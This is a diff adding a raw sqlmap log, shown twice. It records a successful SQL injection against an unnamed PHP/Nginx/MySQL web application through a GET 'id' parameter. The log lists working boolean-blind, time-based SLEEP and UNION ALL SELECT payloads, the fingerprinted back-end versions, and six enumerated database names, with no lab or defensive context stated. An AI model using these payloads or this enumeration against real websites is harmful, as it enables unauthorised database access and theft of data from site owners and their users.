@@ -1,0 +1,50 @@
+sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1375828 AND 8077=8077
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1375828 AND SLEEP(5)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 6 columns
+    Payload: id=-3253 UNION ALL SELECT NULL,NULL,CONCAT(0x71716a7171,0x78486d4a7a655a745253416275776571614277704c444a424d47555779685a79686b6e5844576755,0x71626b7171),NULL,NULL,NULL#
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL >= 5.0.12
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] news
+[*] oss
+[*] performance_schema
+[*] test
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1375828 AND 8077=8077
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1375828 AND SLEEP(5)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 6 columns
+    Payload: id=-3253 UNION ALL SELECT NULL,NULL,CONCAT(0x71716a7171,0x78486d4a7a655a745253416275776571614277704c444a424d47555779685a79686b6e5844576755,0x71626b7171),NULL,NULL,NULL#
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL >= 5.0.12
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] news
+[*] oss
+[*] performance_schema
+[*] test
+
